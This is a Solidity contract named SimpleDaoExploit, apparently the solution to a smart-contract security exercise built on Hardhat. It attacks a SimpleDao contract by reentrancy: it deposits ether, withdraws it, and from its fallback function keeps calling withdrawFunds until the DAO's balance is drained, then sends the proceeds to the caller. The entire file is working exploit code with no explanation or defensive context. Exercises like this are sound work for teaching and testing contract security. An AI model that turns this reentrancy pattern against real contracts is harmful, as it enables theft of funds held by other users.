//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "../SimpleDao.sol";
import "hardhat/console.sol";

contract SimpleDaoExploit {
    SimpleDao dao;
    uint256 value;

    function exploit(address target) public payable {
        // Exploit start
        dao = SimpleDao(target);
        value = msg.value;
        dao.depositFunds{value: value}();
        dao.withdrawFunds(value);
        payable(msg.sender).call{value: address(this).balance}("");
        // Exploit end
    }

    fallback() external payable {
        // Exploit start
        uint256 remainingBalance = address(dao).balance;
        if (remainingBalance > 0) {
            dao.withdrawFunds(
                remainingBalance > value ? value : remainingBalance
            );
        }
        // Exploit end
    }
}
